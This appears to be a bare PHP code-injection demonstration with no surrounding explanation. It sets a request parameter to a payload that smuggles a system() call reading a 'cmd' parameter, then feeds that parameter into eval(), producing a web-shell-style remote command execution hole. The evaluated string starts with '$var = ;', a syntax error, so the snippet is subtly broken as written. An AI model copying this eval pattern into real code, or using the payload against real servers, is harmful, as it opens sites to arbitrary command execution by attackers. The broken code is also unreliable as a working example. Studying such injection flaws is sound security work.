<?php
$_GET['code'] = '; echo system($_GET["cmd"]);';
$code = $_GET['code'];
eval('$var = '.$code.';');
echo $var;
?>